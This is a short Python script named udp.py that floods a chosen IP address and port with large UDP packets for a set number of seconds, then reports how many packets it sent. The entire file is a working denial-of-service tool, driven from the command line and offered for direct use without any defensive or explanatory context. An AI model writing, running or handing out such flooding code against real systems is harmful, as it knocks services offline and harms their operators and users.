import socket
import random
import sys
import time

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = random.randint(65000, 65335)
    packet_count = 0
    start_time = time.time()
    
    while time.time() - start_time < duration:
        packet = bytearray(packet_size)
        sock.sendto(packet, (target_ip, target_port))
        packet_count += 1
    
    sock.close()
    
    return packet_count

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python udp.py <ip> <port> <time>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    packet_count = udp_flood(target_ip, target_port, duration)
    print("Sent {} packets in {} seconds".format(packet_count, duration))￼Enter
